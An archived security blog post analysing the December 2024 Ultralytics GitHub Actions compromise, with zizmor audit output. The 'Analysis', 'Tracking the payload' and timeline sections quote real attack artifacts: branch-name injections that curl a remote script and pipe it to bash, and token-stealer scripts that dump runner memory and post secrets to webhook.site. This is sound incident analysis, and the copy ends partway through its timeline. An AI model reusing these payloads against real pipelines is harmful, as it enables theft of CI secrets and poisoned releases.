---
url: "https://blog.yossarian.net/2024/12/06/zizmor-ultralytics-injection"
title: "zizmor would have caught the Ultralytics workflow vulnerability"
captured: "2026-11-02T18:24:00Z"
via: "live"
sha256: "65006afb1d09743d7deceefa0c499eadc9333412a1cbead19c679cd5cfe61cb5"
cited_in:
  - "docs/threats/02-supply-chain-packages.md"
---

# zizmor would have caught the Ultralytics workflow vulnerability

> Archived copy of a third-party page, kept so Bigman's findings survive if the original goes away. Copyright stays with the original publisher; cite the original URL.
>
> Original: <https://blog.yossarian.net/2024/12/06/zizmor-ultralytics-injection>

# ENOSUCHBLOG

## Programming, philosophy, pedaling.

- [Home](https://blog.yossarian.net/)
- [Tags](https://blog.yossarian.net/tags)
- [Series](https://blog.yossarian.net/series)
- [Favorites](https://blog.yossarian.net/favorites)
- [Archive](https://blog.yossarian.net/archive)
- [Main Site](https://yossarian.net)
- [TILs](https://yossarian.net/til)

#  [zizmor would have caught the Ultralytics workflow vulnerability](https://blog.yossarian.net/2024/12/06/zizmor-ultralytics-injection)

##

Dec 6, 2024  Tags: [oss](https://blog.yossarian.net/tags#oss), [security](https://blog.yossarian.net/tags#security), [zizmor](https://blog.yossarian.net/tags#zizmor)

This post is at least a year old.

TL;DR: [zizmor](https://github.com/woodruffw/zizmor) would have caught the vulnerability that caused this…mostly. [Read on](https://blog.yossarian.net/2024/12/06/zizmor-ultralytics-injection#would-zizmor-have-caught-this) for details.

```

 |

```
1
2
3
4
5
6
7
8
9
10
11

```

 |

```
error[dangerous-triggers]: use of fundamentally insecure workflow trigger
--> .github/workflows/cla.yml:6:1
|
6 | / on:
7 | |   issue_comment:
...  |
13 | |       - opened
14 | |       - synchronize
| |___________________^ pull_request_target is almost always used insecurely
|
= note: audit confidence → Medium

```

```

Important: I’m writing this post in real time as I learn more about what happened here. I’ll be updating it throughout the day.

EDIT: I’ve reached the point here where I feel comfortable making some inferences/conclusions. These are in the [Conclusions](https://blog.yossarian.net/2024/12/06/zizmor-ultralytics-injection#conclusions) section.

EDIT 2024-12-07: Today is the last day I’ll be making updates to this post. The [Conclusions](https://blog.yossarian.net/2024/12/06/zizmor-ultralytics-injection#conclusions) are now fully updated, and I’ve added a rough (but comprehensive) [timeline of events](https://blog.yossarian.net/2024/12/06/zizmor-ultralytics-injection#appendix-rough-timeline-of-events) as an appendix.

## Summary[#](https://blog.yossarian.net/2024/12/06/zizmor-ultralytics-injection#summary)

Yesterday, someone exploited [Ultralytics](https://github.com/ultralytics/ultralytics), which is a very popular machine learning package for vision stuff™. The attacker appears to have compromised Ultralytics’ CI, and then pivoted to making a malicious PyPI release (v8.3.41, now deleted[1](https://blog.yossarian.net/2024/12/06/zizmor-ultralytics-injection#fn:file)), which contained a crypto miner.

It appears as though a subsequent release (v8.3.42, also now deleted) was also malicious.

UPDATE 2024-12-07: [Ultralytics](https://github.com/ultralytics/ultralytics) was compromised again, within 36 hours of the last compromise. This latest compromise appears to have resulted in two more malicious releases, v8.3.45 and v8.3.46, both of which were released directly to PyPI and have since been deleted. These releases appear to have been pushed directly by the attacker using an API token stolen from the [ultralytics/ultralytics](https://github.com/ultralytics/ultralytics) CI/CD, likely at the same time as they conducted the original exfiltration and cache poisoning attack.

## Analysis[#](https://blog.yossarian.net/2024/12/06/zizmor-ultralytics-injection#analysis)

Here’s the rough flow of what happened:

-

The [@openimbot](https://github.com/openimbot) account opens a PR, [#18020](https://github.com/ultralytics/ultralytics/pull/18020), against the upstream [ultralytics/ultralytics](https://github.com/ultralytics/ultralytics) repository.

- This appears to be a bot account, but presumably has some underlying functionality that allowed a human being to open a PR under its name.

-

PR [#18020](https://github.com/ultralytics/ultralytics/pull/18020) has a malicious branch name:

```

 |

```
1

```

 |

```
openimbot:$({curl,-sSfL,raw.githubusercontent.com/ultralytics/ultralytics/d8daa0b26ae0c221aa4a8c20834c4dbfef2a9a14/file.sh}${IFS}|${IFS}bash)

```

```

or formatted, with ${IFS} expanded with spaces:

```

 |

```
1

```

 |

```
$({curl,-sSfL,raw.githubusercontent.com/ultralytics/ultralytics/d8daa0b26ae0c221aa4a8c20834c4dbfef2a9a14/file.sh} | bash)

```

```

NOTE: I haven’t been able to get my hands on this payload yet; if you have access to it, ping me!

-

This gets picked up by the [format.yml workflow](https://github.com/ultralytics/ultralytics/blob/eb3783763dae921ada76bbb4d01a96ec5d412334/.github/workflows/format.yml), which has a fundamentally dangerous workflow trigger (pull_request_target).

-

format.yml calls a custom action, defined in ultralytics/actions:

```

 |

```
1
2
3
4
5
6

```

 |

```
steps:
- name: Run Ultralytics Formatting
uses: ultralytics/actions@main
with:
token: ${{ secrets._GITHUB_TOKEN }} # note GITHUB_TOKEN automatically generated
# ... snip ...

```

```

-

The custom action is a composite action with shell steps in its [action.yml](https://github.com/ultralytics/actions/blob/63d2cd98a098f45d5532e3b1ee7715bae66280c2/action.yml), including the following:

```

 |

```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16

```

 |

```
- name: Commit and Push Changes
if: (github.event_name == 'pull_request' || github.event_name == 'pull_request_target') && github.event.action != 'closed'
run: |
git config --global user.name "${{ inputs.github_username }}"
git config --global user.email "${{ inputs.github_email }}"
git pull origin ${{ github.head_ref || github.ref }}
git add .
git reset HEAD -- .github/workflows/  # workflow changes are not permitted with default token
if ! git diff --staged --quiet; then
git commit -m "Auto-format by https://ultralytics.com/actions"
git push
else
echo "No changes to commit"
fi
shell: bash
continue-on-error: false

```

```

-

Line 6 above is a classic GitHub Actions [template injection](https://woodruffw.github.io/zizmor/audits/#template-injection): the expansion of github.head_ref || github.ref is injected directly into the shell’s context, with no quoting or interpolation.

I believe this is where the malicious branch name gets injected, resulting in the payload (inside raw.githubusercontent.com/ultralytics/ultralytics/d8daa0b26ae0c221aa4a8c20834c4dbfef2a9a14/file.sh) being run.

-

From here, the attacker is running code of their choice in a pull_request_target context, meaning that (by default) they have access to anything a normal privileged workflow can do.

In particular, that means they (almost certainly) had (or still have) push access to [ultralytics/ultralytics](https://github.com/ultralytics/ultralytics) itself, as well as to the repository’s privileged caches. Either one of these was/is an effective vector for compromising the repository contents and/or the contents of its artifacts.

-

I don’t know yet how the attacker pivoted from this pull_request_target context to compromising the PyPI package that was then uploaded and eventually noticed by users in [#18027](https://github.com/ultralytics/ultralytics/issues/18027). Their underlying technique there would probably be revealed by the payload inside of the shell script above.

EDIT: My colleague Will Tan pointed out that one of the fix PRs, [#18052](https://github.com/ultralytics/ultralytics/pull/18052), also removes cache: "pip" from one of the setup-python sites. This suggests that the underlying vector was indeed a poisoned cache, introduced after the code injection.

EDIT: [Seth Larson](https://sethmlarson.dev/) and [Ee Durbin](https://durbin.ee/) point out that the Ultralytics is using [Trusted Publishing](https://docs.pypi.org/trusted-publishers/) with PyPI, but they aren’t using a configured deployment environment. That means that they have/had no additional signoff or other environment protections on PyPI releases, which in turn suggests that workflow compromise was sufficient to induce the publish event.

EDIT: [Adnan Khan](https://github.com/AdnaneKhan) has [pointed out](https://github.com/ultralytics/ultralytics/issues/18027#issuecomment-2524133799) the likely cache entry that was poisoned to compromise the build in this case. Combined with the CacheServerUrl exfiltration observed below, this very strongly suggests that the attacker used a poisoned cache.

Regardless of how the pull_request_target pivot occurred, it appears as though [cb260c243ffa3e0cc84820095cd88be2f5db86ca](https://github.com/ultralytics/ultralytics/commit/cb260c243ffa3e0cc84820095cd88be2f5db86ca) is the triggering commit for the first malicious release: it bumps the version to the first known malicious version (v8.3.41) and, critically, removes a github.actor check that limited who could do publish.yml triggers from the main branch:

```

 |

```
1
2

```

 |

```
- if: github.repository == 'ultralytics/ultralytics' && github.actor == 'glenn-jocher'
+ if: github.repository == 'ultralytics/ultralytics'

```

```

At this point, the publish.yml workflow is triggered on a push event for the main branch, resulting in an action run that published v8.3.41 to PyPI. I’ve uploaded the publish.yml action log [here](https://gist.github.com/woodruffw/7d6a07077842508b85008e0267f7f3bb).

The sdist and wheel for v8.3.41 can also be found in Sigstore’s transparency log as [153415338](https://search.sigstore.dev/?logIndex=153415338) and [153415340](https://search.sigstore.dev/?logIndex=153415340) respectively.

[Adnan Khan](https://github.com/AdnaneKhan) also [points out](https://github.com/ultralytics/ultralytics/issues/18027#issuecomment-2523875957) that [153589717](https://search.sigstore.dev/?logIndex=153589717) is the Sigstore transparency log entry for one of v8.3.42’s distributions.

All of these log entries show a push event for main.

All in all, malicious version of Ultralytics were available on PyPI for [about 13 hours](https://github.com/ultralytics/ultralytics/issues/18027#issuecomment-2523755580). The discussion in [#18027](https://github.com/ultralytics/ultralytics/issues/18027) has lots of additional details, including some analysis of the payload in the Python package itself (which I haven’t analyzed yet).

## Tracking the payload[#](https://blog.yossarian.net/2024/12/06/zizmor-ultralytics-injection#tracking-the-payload)

I’m breaking this section out because it’s proving to be independently interesting.

This is the initial payload, which now 404s presumably because GitHub has taken it down:

```

 |

```
1

```

 |

```
hxxps://raw.githubusercontent.com/ultralytics/ultralytics/d8daa0b26ae0c221aa4a8c20834c4dbfef2a9a14/file.sh

```

```

[Andy Lindeman](https://github.com/alindeman) conducted a search for similar branch names pushed by other users, and discovered that [@jiwuwgknvm](https://github.com/jiwuwgknvm) (user ID 190546325, now deleted) created a branch with a similar name at 12/3/2024 22:32:01.

```

 |

```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21

```

 |

```
{
"repository_id": 898159334,
"push_id": 21527588446,
"size": 1,
"distinct_size": 1,
"ref": "refs/heads/$({curl,-sSfL,gist.githubusercontent.com/jiwuwgknvm/7037bca8cde383718b5c3e7142b0dd8b/raw/run.sh}${IFS}|${IFS})",
"head": "c81850c5d3c1815ae86c44f0abb83dafc5bf37e5",
"before": "21162bd870444550286983a601afbfb142f4c198",
"commits": [
{
"sha": "c81850c5d3c1815ae86c44f0abb83dafc5bf37e5",
"author": {
"email": "ef65d58e27c5649bcc0a8b9706f2849d67677ab3@users.noreply.github.com",
"name": "jiwuwgknvm"
},
"message": "[skip ci] Update README.md",
"distinct": true,
"url": "https://api.github.com/repos/jiwuwgknvm/ultralytics/commits/c81850c5d3c1815ae86c44f0abb83dafc5bf37e5"
}
]
}

```

```

This branch references a different payload, this time in a Gist:

```

 |

```
1

```

 |

```
hxxps://gist.githubusercontent.com/jiwuwgknvm/7037bca8cde383718b5c3e7142b0dd8b/raw/run.sh

```

```

That URL 404s, but the underlying Gist repository is still live:

```

 |

```
1
2

```

 |

```
$ git@gist.github.com:7037bca8cde383718b5c3e7142b0dd8b.git run && ls run
run.sh

```

```

…and run.sh contains a standard GITHUB_TOKEN stealer:

```

 |

```
1
2
3
4
5
6
7
8
9
10
11
12
13

```

 |

```
YOUR_EXFIL="webhook.site/31c2eb17-ae87-4aaf-835a-ef2d225d58d0"

if [[ "$OSTYPE" == "linux-gnu" ]]; then
B64_BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0`
# Exfil to Burp
curl -s -d "$B64_BLOB" https://$YOUR_EXFIL/token > /dev/null
else
exit 0
fi

BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"AccessToken":"[^"]*"\}' | sort -u`
BLOB2=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"CacheServerUrl":"[^"]*"' | sort -u`
curl -s -d "$BLOB $BLOB2" https://$YOUR_EXFIL/token > /dev/null

```

```

The git log for the gist suggests that the [@jiwuwgknvm](https://github.com/jiwuwgknvm) identity is also in control of consrensys.com, which was one of the original IOCs for the dropped miner.

```

 |

```
1
2
3
4

```

 |

```
$ git log
commit b9029cbea0ed7ac5bdd928c1c185f4d5c9384a33 (HEAD -> main, origin/main, origin/HEAD)
Author: jiwuwgknvm <fowevjweoj@consrensys.com>
Date:   Tue Dec 3 22:26:28 2024 +0000

```

```

EDIT: [Seth Larson](https://sethmlarson.dev/) observes that the stealer also steals the CacheServerUrl, providing more circumstantial evidence for the cache poisoning hypothesis.

[Andy Lindeman](https://github.com/alindeman) also discovered an earlier GitHub identity, [@jeficmer456](https://github.com/jeficmer456) (also deleted), which appears to have been experimenting with the template injection even earlier (circa 12/2/2024 3:09:58):

```

 |

```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21

```

 |

```
{
"repository_id": 897066482,
"push_id": 21489353876,
"size": 1,
"distinct_size": 1,
"ref": "refs/heads/preview/$(curl,-sSfL,https/gist.githubusercontent.com/jefic6421/4c439e3fa47435a52d55027fbcf8f454/raw/morning_joe.sh${IFS}|bash)\"",
"head": "5ff55a620e46ddac1e2af42c27ebc35d8a257d25",
"before": "b751d508e5149ced753c4a73c271032d1ef55e1d",
"commits": [
{
"sha": "5ff55a620e46ddac1e2af42c27ebc35d8a257d25",
"author": {
"email": "0b4c7ddc61d5cafe49babc3dd544c5aa0b03815c@proton.me",
"name": "jeficmer456"
},
"message": "Update preview-release-on-comment.yml\n\nUpdate preview-release-on-comment.yml",
"distinct": true,
"url": "https://api.github.com/repos/jeficmer456/merchant-center-application-kit/commits/5ff55a620e46ddac1e2af42c27ebc35d8a257d25"
}
]
}

```

```

This led to another user Gist:

```

 |

```
1
2

```

 |

```
$ git clone git@gist.github.com:4c439e3fa47435a52d55027fbcf8f454.git run && ls run
morningjoe.sh

```

```

Where morningjoe.sh:

```

 |

```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21

```

 |

```
#!/bin/bash
echo "Creating a new file with coffee cup ASCII art in the repository..."

# Define the file name and content
FILE_NAME="coffee_art.txt"
ART="
( (
) )
.....
|   | ]]
|---|
|   |
"

# Create the file
echo "$ART" > $FILE_NAME

# Commit and push the file
git add $FILE_NAME
git commit -m "Added coffee_art.txt"
git push origin HEAD

```

```

The git log for this Gist suggests the identity goes back to 2024-12-01:

```

 |

```
1
2
3
4
5
6
7
8
9
10
11

```

 |

```
commit 8f6aa1be0f49c7bdd5e65a7f140dc7b8ac9e4e75 (HEAD -> main, origin/main, origin/HEAD)
Author: jefic6421 <jefic64219@confmin.com>
Date:   Sun Dec 1 22:46:53 2024 -0500

commit 43c355c4b2407a37d6e8d14408fb59815a5d04c6
Author: jefic6421 <jefic64219@confmin.com>
Date:   Sun Dec 1 22:21:06 2024 -0500

commit 3def13bcc973d3d4c50513b2530afca04dc94617
Author: jefic6421 <jefic64219@confmin.com>
Date:   Sun Dec 1 22:05:15 2024 -0500

```

```

This email identity is also separate from the one associated with the Gist, per above (0b4c7ddc61d5cafe49babc3dd544c5aa0b03815c@proton.me).

## Would [zizmor](https://github.com/woodruffw/zizmor) have caught this?[#](https://blog.yossarian.net/2024/12/06/zizmor-ultralytics-injection#would-zizmor-have-caught-this)

This is what I immediately wondered upon seeing this. Let’s find out!

Here is what [zizmor](https://github.com/woodruffw/zizmor) reports for [v8.3.40](https://github.com/ultralytics/ultralytics/tree/v8.3.40), i.e. the release state right before the attack:

```

 |

```
1

```

 |

```
$ zizmor --gh-token=$(gh auth token) ultralytics/ultralytics@v8.3.40

```

```

NOTE: Passing ultralytics/ultralytics@v8.3.40 directly is supported on main, but isn’t in a release of [zizmor](https://github.com/woodruffw/zizmor) yet. To reproduce with a released version, you can git clone [Ultralytics](https://github.com/ultralytics/ultralytics) and run [zizmor](https://github.com/woodruffw/zizmor) on a checkout of [v8.3.40](https://github.com/ultralytics/ultralytics/tree/v8.3.40).

I’ve excerpted the output substantially, to remove findings that [Ultralytics](https://github.com/ultralytics/ultralytics) should fix but are not immediately relevant to this particular exploit:

```

 |

```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169

```

 |

```
error[dangerous-triggers]: use of fundamentally insecure workflow trigger
--> .github/workflows/cla.yml:6:1
|
6 | / on:
7 | |   issue_comment:
...  |
13 | |       - opened
14 | |       - synchronize
| |___________________^ pull_request_target is almost always used insecurely
|
= note: audit confidence → Medium

info[template-injection]: code injection via template expansion
--> .github/workflows/docs.yml:55:9
|
55 |         - name: Update Docs Reference Section and Push Changes
|           ---------------------------------------------------- info: this step
56 |           continue-on-error: true
57 |           run: |
|  _________-
58 | |           python docs/build_reference.py
...  |
66 | |             echo "No changes to commit"
67 | |           fi
| |____________- info: github.head_ref may expand into attacker-controllable code
|
= note: audit confidence → Low

info[template-injection]: code injection via template expansion
--> .github/workflows/docs.yml:55:9
|
55 |         - name: Update Docs Reference Section and Push Changes
|           ---------------------------------------------------- info: this step
56 |           continue-on-error: true
57 |           run: |
|  _________-
58 | |           python docs/build_reference.py
...  |
66 | |             echo "No changes to commit"
67 | |           fi
| |____________- info: github.ref may expand into attacker-controllable code
|
= note: audit confidence → Low

info[template-injection]: code injection via template expansion
--> .github/workflows/docs.yml:74:9
|
74 |         - name: Commit and Push Docs changes
|           ---------------------------------- info: this step
75 |           continue-on-error: true
76 |           if: always()
77 |           run: |
|  _________-
78 | |           git pull origin ${{ github.head_ref || github.ref }}
...  |
85 | |             echo "No changes to commit"
86 | |           fi
| |____________- info: github.head_ref may expand into attacker-controllable code
|
= note: audit confidence → Low

info[template-injection]: code injection via template expansion
--> .github/workflows/docs.yml:74:9
|
74 |         - name: Commit and Push Docs changes
|           ---------------------------------- info: this step
75 |           continue-on-error: true
76 |           if: always()
77 |           run: |
|  _________-
78 | |           git pull origin ${{ github.head_ref || github.ref }}
...  |
85 | |             echo "No changes to commit"
86 | |           fi
| |____________- info: github.ref may expand into attacker-controllable code
|
= note: audit confidence → Low

info[template-injection]: code injection via template expansion
--> .github/workflows/docs.yml:87:9
|
87 |         - name: Publish Docs to https://docs.ultralytics.com
|           -------------------------------------------------- info: this step
88 |           if: github.event_name == 'push' || (github.event_name == 'workflow_dispatch' && github.event.inputs.publish_docs == 'true')
89 |           run: |
|  _________-
90 | |           git clone https://github.com/ultralytics/docs.git docs-repo
...   |
102 | |             git push https://${{ secrets._GITHUB_TOKEN }}@github.com/ultralytics/docs.git gh-pages
103 | |           fi
| |_____________- info: steps.check_pypi.outputs.version may expand into attacker-controllable code
|
= note: audit confidence → Low

error[dangerous-triggers]: use of fundamentally insecure workflow trigger
--> .github/workflows/format.yml:7:1
|
7 | / on:
8 | |   issues:
...  |
13 | |     branches: [main]
14 | |     types: [opened, closed, synchronize, review_requested]
| |__________________________________________________________^ pull_request_target is almost always used insecurely
|
= note: audit confidence → Medium

info[template-injection]: code injection via template expansion
--> .github/workflows/publish.yml:62:9
|
62 |         - name: Publish new tag
|           --------------------- info: this step
63 |           if: (github.event_name == 'push' || github.event.inputs.pypi == 'true')  && steps.check_pypi.outputs.increment == 'True'
64 |           run: |
|  _________-
65 | |           git tag -a "${{ steps.check_pypi.outputs.current_tag }}" -m "$(git log -1 --pretty=%B)"  # i.e. "v0.1.2 commit message"
66 | |           git push origin "${{ steps.check_pypi.outputs.current_tag }}"
| |_______________________________________________________________________- info: steps.check_pypi.outputs.current_tag may expand into attacker-controllable code
|
= note: audit confidence → Low

info[template-injection]: code injection via template expansion
--> .github/workflows/publish.yml:62:9
|
62 |         - name: Publish new tag
|           --------------------- info: this step
63 |           if: (github.event_name == 'push' || github.event.inputs.pypi == 'true')  && steps.check_pypi.outputs.increment == 'True'
64 |           run: |
|  _________-
65 | |           git tag -a "${{ steps.check_pypi.outputs.current_tag }}" -m "$(git log -1 --pretty=%B)"  # i.e. "v0.1.2 commit message"
66 | |           git push origin "${{ steps.check_pypi.outputs.current_tag }}"
| |_______________________________________________________________________- info: steps.check_pypi.outputs.current_tag may expand into attacker-controllable code
|
= note: audit confidence → Low

error[template-injection]: code injection via template expansion
--> .github/workflows/publish.yml:76:9
|
76 |         - name: Extract PR Details
|           ^^^^^^^^^^^^^^^^^^^^^^^^ this step
77 |           env:
78 |             GH_TOKEN: ${{ secrets._GITHUB_TOKEN }}
79 |           run: |
|  _________^
80 | |           # Check if the event is a pull request or pull_request_target
...  |
91 | |           echo "PR_NUMBER=$PR_NUMBER" >> $GITHUB_ENV
92 | |           echo "PR_TITLE=$PR_TITLE" >> $GITHUB_ENV
| |__________________________________________________^ github.event.pull_request.number may expand into attacker-controllable code
|
= note: audit confidence → High

error[template-injection]: code injection via template expansion
--> .github/workflows/publish.yml:76:9
|
76 |         - name: Extract PR Details
|           ^^^^^^^^^^^^^^^^^^^^^^^^ this step
77 |           env:
78 |             GH_TOKEN: ${{ secrets._GITHUB_TOKEN }}
79 |           run: |
|  _________^
80 | |           # Check if the event is a pull request or pull_request_target
...  |
91 | |           echo "PR_NUMBER=$PR_NUMBER" >> $GITHUB_ENV
92 | |           echo "PR_TITLE=$PR_TITLE" >> $GITHUB_ENV
| |__________________________________________________^ github.event.after may expand into attacker-controllable code
|
= note: audit confidence → High

37 findings (16 suppressed): 0 unknown, 7 informational, 1 low, 4 medium, 9 high

```

```

All told, [zizmor](https://github.com/woodruffw/zizmor) detects the key parts of the exploit chain:

- It flags .github/workflows/format.yml:7:1 as using a fundamentally insecure trigger (pull_request_target);
- It flags other sources of template/code injection in the [Ultralytics](https://github.com/ultralytics/ultralytics) workflows, including identical uses of the git pull <template expression> pattern that made their custom action exploitable.

At the same time, [zizmor](https://github.com/woodruffw/zizmor) does not detect the template injection within [ultralytics/actions](https://github.com/ultralytics/actions) yet, since I haven’t yet added support for auditing composite actions. This is being tracked in [zizmor#173](https://github.com/woodruffw/zizmor/issues/173), and this incident is as good an impetus as any for me to begin work on this!

## Conclusions[#](https://blog.yossarian.net/2024/12/06/zizmor-ultralytics-injection#conclusions)

Based on everything above, here’s how it likely went down:

-

The attacker obtained code execution in the parent ([ultralytics/ultralytics](https://github.com/ultralytics/ultralytics)) CI context via an insecure workflow trigger (pull_request_target) combined with a template injection in a custom composite GitHub Action. In other words, they performed a traditional [“pwn request”](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/) of the sort that’s been well-understood since 2021.

-

The attacker used [@openimbot](https://github.com/openimbot) as a puppet account, but also used the [@jiwuwgknvm](https://github.com/jiwuwgknvm) identity while developing their exploit. They may or may not also be the [@jeficmer456](https://github.com/jeficmer456) identity, which tried to exploit a different repository shortly before with a similar shell-script-in-Gist technique.

At this point, it’s unclear whether [@openimbot](https://github.com/openimbot) is controlled by the attacker or not.

-

Once the attacker had code execution, they used a ready-made token exfiltration script that they took [directly from Adnan Khan’s excellent post on GitHub Actions cache poisoning](https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/).

-

This script probably posted back to a webhook panel on webhook.site, one that we don’t have access to (since we only have their earlier run.sh attempt, not the final file.sh one).

-

With the stolen cache token, they likely effected a cache poisoning attack on the pip cache used by setup-python, injecting their changes into the release distributions. Those changes were a client-side downloader stage (patched into the safe_download function) and the client side miner execution (patched into the safe_run function).

- The poisoned cache key is almost certainly setup-python-Linux-x64-22.04-Ubuntu-python-3.12.7-pip-b25cacffbe61fd843ecfbb789bb607be3256af9f6e06a467b860c4324e336ee.

There are still some loose ends here (like the actual file.sh payload), but the circumstantial evidence very strongly suggests the above.

## Appendix: Rough timeline of events[#](https://blog.yossarian.net/2024/12/06/zizmor-ultralytics-injection#appendix-rough-timeline-of-events)

Here is the rough overall timeline of what occurred, as best as I can figure it. I’ve left out events for the [@jiwuwgknvm](https://github.com/jiwuwgknvm) identity’s setup and weaponization phase, since I don’t have a complete view of that yet.

UPDATE: Gaëtan Ferry and Guillaume Valadon at GitGuardian have put together a [reconstructed analysis of the attack](https://blog.gitguardian.com/the-ultralytics-supply-chain-attack-connecting-the-dots-with-gitguardians-public-monitoring-data/), including a recovery of the final payload used by the attacker. Their analysis confirms that the attacker succeeded in their first PR ([#18018](https://github.com/ultralytics/ultralytics/pull/18018)) but never pushed the commit that would have enabled their second PR ([#18020](https://github.com/ultralytics/ultralytics/pull/18020)). Moreover, thanks to their repository monitoring, they were able to recover the payload itself, which is a modified variant of the the one used in the exploratory phase:

```

 |

```
1
2
3
4
5

```

 |

```
AA="webhook.site/9212d4ee-df58-41db-886a-98d180a912e6"

BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"AccessToken":"[^"]*"\}' | sort -u`
BLOB2=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"CacheServerUrl":"[^"]*"' | sort -u`
curl -s -d "$BLOB $BLOB2" https://$AA/token > /dev/null

```

```

-

2024-08-14: [Adnan Khan](https://github.com/AdnaneKhan) reports [GHSA-7x29-qqmq-v6qc](https://github.com/advisories/GHSA-7x29-qqmq-v6qc) to the [Ultralytics](https://github.com/ultralytics/ultralytics) maintainers. This contains a template injection vulnerability virtually identical to the one used by the attacker.

-

2024-08-14: v0.0.3 of [ultralytics/actions](https://github.com/ultralytics/actions) is released with a fix for [GHSA-7x29-qqmq-v6qc](https://github.com/advisories/GHSA-7x29-qqmq-v6qc).

-

2024-08-24: v0.0.24 of [ultralytics/actions](https://github.com/ultralytics/actions) reintroduces the vulnerability in [c1365cedb65b86d4f77cabc192873ee4b6b33276](https://github.com/ultralytics/actions/commit/c1365cedb65b86d4f77cabc192873ee4b6b33276).

-

2024-12-03 22:28:49: the [@jiwuwgknvm](https://github.com/jiwuwgknvm) identity begins experimenting with a weaponized attack against [ultralytics/ultralytics](https://github.com/ultralytics/ultralytics). It’s unclear whether this identity is the same person or people as others who attempted to weaponize code injection via branches as early as 2024-10-02.

-

2024-12-03 22:33:47: the [@jiwuwgknvm](https://github.com/jiwuwgknvm) identity submits PR #17984 (now deleted) to [ultralytics/ultralytics](https://github.com/ultralytics/ultralytics), which contains the run.sh token stealer and exfiltration script above.

From this point on, the repository should be considered to be compromised: the attacker is assumed to have access to everything in the secrets context, including any GitHub PATs and the PyPI API token (which was not in use, since Ultralytics had switched to [Trusted Publishing](https://docs.pypi.org/trusted-publishers/)).

-

2024-12-04 19:33: the [@openimbot](https://github.com/openimbot) identity submits PR [#18018](https://github.com/ultralytics/ultralytics/pull/18018) to [ultralytics/ultralytics](https://github.com/ultralytics/ultralytics), containing a template injection via a crafted branch name.

Branch payload:

```

 |

```
1

```

 |

```
$({curl,-sSfL,raw.githubusercontent.com/ultralytics/ultralytics/12e4f54ca3f2e69bcdc900d1c6e16642ca8ae545/file.sh}${IFS}|${IFS}bash)

```

```

-

2024-12-04 19:57: the [@openimbot](https://github.com/openimbot) identity submits PR [#18020](https://github.com/ultralytics/ultralytics/pull/18020) to [ultralytics/ultralytics](https://github.com/ultralytics/ultralytics), containing a different template injection via a crafted branch name.

Branch payload:

```

 |

```
1

```

 |

```
$({curl,-sSfL,raw.githubusercontent.com/ultralytics/ultralytics/d8daa0b26ae0c221aa4a8c20834c4dbfef2a9a14/file.sh}${IFS}|${IFS}bash)

```

```

-

2024–12–04 20:50: Release for v8.3.41 is triggered by the [@UltralyticsAssistant](https://github.com/UltralyticsAssistant) identity via commit [cb260c243ffa3e0cc84820095cd88be2f5db86ca](https://github.com/ultralytics/ultralytics/commit/cb260c243ffa3e0cc84820095cd88be2f5db86ca), which also disables the actor release restriction for [@glenn-jocher](https://github.com/glenn-jocher). This strongly suggests that the attacker is in full control of the [@UltralyticsAssistant](https://github.com/UltralyticsAssistant) identity at this point.

Workflow run: https://github.com/ultralytics/ultralytics/actions/runs/12168072999/job/33938058724.

-

2024-12-04 20:51: Sigstore’s transparency log records [153415338](https://search.sigstore.dev/?logIndex=153415338) and [153415340](https://search.sigstore.dev/?logIndex=153415340) indicating two attestations, one for each of the distributions of v8.3.41 that will appear on PyPI (ultralytics-8.3.41.tar.gz and ultralytics-8.3.41-py3-none-any.whl).

-

2024-12-04 20:51: v8.3.41 is uploaded to PyPI with a Trusted Publisher and valid attestations for each distribution, matching the [ultralytics/ultralytics](https://github.com/ultralytics/ultralytics) Trusted Publisher identity.

- A detailed sub-item timeline for this upload is available in [this comment](https://github.com/ultralytics/ultralytics/issues/18027#issuecomment-2523755580).

-

2024-12-05 06:34: [#18027](https://github.com/ultralytics/ultralytics/issues/18027) is opened on GitHub by [Eric Johnson](https://github.com/metrizable), identifying v8.3.41 as malicious.

-

2024-12-05 09:15:06: v8.3.41 is removed from PyPI (approx. 12 hours after introduction).

-

2024-12-05 12:46: Release for v8.3.42 is triggered by [@glenn-jocher](https://github.com/glenn-jocher) via commit [950d9f73fc3e12c87e45f4f792281ee8e3cfc75f](https://github.com/ultralytics/ultralytics/commit/950d9f73fc3e12c87e45f4f792281ee8e3cfc75f). At this point the actor release restriction is back in place, but has no effect as [@glenn-jocher](https://github.com/glenn-jocher) is the one making the release.

Workflow run: https://github.com/ultralytics/ultralytics/actions/runs/12180037832/job/33973482495.

-

